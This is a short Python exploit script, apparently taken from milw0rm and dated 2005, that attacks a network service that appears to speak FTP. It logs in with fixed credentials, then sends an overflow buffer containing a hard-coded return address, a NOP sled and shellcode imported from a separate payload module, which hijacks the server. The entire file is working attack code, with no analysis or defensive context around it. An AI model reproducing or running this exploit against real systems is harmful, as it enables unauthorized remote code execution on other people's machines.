#!/usr/bin/python
from payload import buf
import socket
import time
import struct

def shell_attack(target_machine, target_port):

	

	

	buffer = b'\x41'*2043+ struct.pack(b"<L",0x7C4FEDBB)+b'\x90'*36+buf
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		
		connect=s.connect((target_machine,target_port))
		d=s.recv(1024)
	
		time.sleep(1)
		s.send(b'USER muts\r\n')
		s.recv(1024)
		
		time.sleep(1)
		s.send(b'PASS muts\r\n')
		s.recv(1024)
		
		time.sleep(1)
		s.send(buffer+b'r\n')
		s.close()
	except:
		pass

	# milw0rm.com [2005-05-01]